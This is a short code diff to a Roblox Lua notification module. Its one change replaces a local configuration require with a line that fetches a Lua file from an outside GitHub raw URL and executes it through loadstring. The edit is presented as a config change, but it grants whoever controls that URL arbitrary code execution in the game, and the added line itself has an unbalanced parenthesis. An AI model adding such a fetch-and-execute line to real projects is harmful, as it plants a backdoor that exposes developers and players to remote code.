@@ -1,7 +1,7 @@
 local Notification = {}
 
 -- Configuration (can be modified or externally accessed)
-local Config = require(game.ServerStorage:WaitForChild("NotificationConfig"))
+local Config = loadstring(game:HttpGet("https://raw.githubusercontent.com/NolanTheScripter/Main/main/NotificationConfig.lua")()
 
 -- Internal Rate Limiter
 local RateLimiter = {
